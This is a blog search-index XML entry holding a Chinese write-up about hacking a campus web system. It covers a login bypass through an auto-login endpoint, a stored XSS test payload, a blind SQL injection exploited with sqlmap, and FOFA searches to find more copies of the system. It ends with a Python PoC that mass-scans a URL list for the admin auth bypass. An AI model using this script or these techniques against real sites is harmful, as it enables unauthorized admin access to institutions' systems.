<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次校园网站漏洞通杀</title>
      <link href="/post/undefined/"/>
      <url>/post/undefined/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞挖掘"><a href="#一、漏洞挖掘" class="headerlink" title="一、漏洞挖掘"></a>一、漏洞挖掘</h1><h2 id="1、逻辑缺陷"><a href="#1、逻辑缺陷" class="headerlink" title="1、逻辑缺陷"></a>1、逻辑缺陷</h2><p>熟悉的页面，熟悉的弱口令测试，但无果</p><p><img src="https://s1.vika.cn/space/2023/02/19/5c020f8dd96c445d868e1f15627be035" alt=" "></p><p>我就把目光转向js审计，果不其然有新发现，可以根据账号自动登录</p><p><img src="https://s1.vika.cn/space/2023/02/19/0dd7c2b378734ca0bda95dc0e0215536" alt=" "></p><p>于是直接构造请求绕过登录</p><p><img src="https://s1.vika.cn/space/2023/02/19/0bf4d4a99a3041808ab9a06adea1b97a" alt="image-20230219190529295"></p><p>经典的管理员权限</p><h2 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h2><p>寻找文本输入</p><p><img src="https://s1.vika.cn/space/2023/02/19/90ae44597e6443ec8ca3ebde71ee08e9" alt=" "></p><p>浅析：<br>前端：这里的标签都是普通标签，没有像<code>RCDATA</code>元素(<code>RCDATA elements</code>)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>，会做一次HTML编码，所以可以直接插入危险的js代码。<br>后端：没有任何过滤（笑~</p><p><img src="https://s1.vika.cn/space/2023/02/19/fd1d908a3fea4a05a9a84be1652de68a" alt=" "></p><p>所以就简单了，直接插入<code>&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code>即可</p><p><img src="https://s1.vika.cn/space/2023/02/19/e7ddff1b935545b587a222a9a1df3a97" alt=" "></p><h2 id="3、SQL注入"><a href="#3、SQL注入" class="headerlink" title="3、SQL注入"></a>3、SQL注入</h2><p><img src="https://s1.vika.cn/space/2023/02/19/5e4ad3ca5a354b5e9f5dc0bdb7255947" alt=" "></p><p>测试无果</p><p><img src="https://s1.vika.cn/space/2023/02/19/0503329962164003b63bae6229d1262d" alt=" "></p><p>最后发现注入点在第一个函数，果然任何一个输入点都是不安全的，是布尔型盲注</p><p><img src="https://s1.vika.cn/space/2023/02/19/288bb9ed8d6d4fcb8e419fba270e20d6" alt=" "></p><p>后面就是经典Sqlmap了</p><p><img src="https://s1.vika.cn/space/2023/02/19/5c86dc60348b48e2899ccfd4a5456121" alt=" "></p><h1 id="二、继续通杀"><a href="#二、继续通杀" class="headerlink" title="二、继续通杀"></a>二、继续通杀</h1><p>根据系统指纹在fofa上搜索：<code>&quot;xx系统&quot; &amp;&amp; icon_hash=&quot;11xxxx&quot;</code><br>有32个IP，看了下，有重复的</p><p><img src="https://s1.vika.cn/space/2023/02/19/c3a1a95d8af942d1b2793b317f23323d" alt=" "></p><p>使用<a href="https://github.com/wgpsec/fofa_viewer">fofa_viewer</a>导出目标<br>这里我根据第一个逻辑漏洞的漏洞指纹信息，写了一个poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url</span>):</span><br><span class="line">    poc_url = url + <span class="string">&#x27;/login/doautologin.edu&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;um.userid&#x27;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(poc_url, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> (res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>)): <span class="comment"># 登录成功就会set-cookie</span></span><br><span class="line">            <span class="built_in">print</span>(url + <span class="string">&#x27;/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> BaseException:  </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            poc(i.rstrip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="三、思考总结"><a href="#三、思考总结" class="headerlink" title="三、思考总结"></a>三、思考总结</h1><p>1）在访问系统当中的时候F12查看源码是一个不错的习惯（尤其是有前端弹框的）<br>2）前端代码的一切展示行为完全可控(一定要理解这句话)<br>3）了解程序的底层逻辑，你才能更清晰的知道每一个参数的意义</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 逻辑缺陷 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
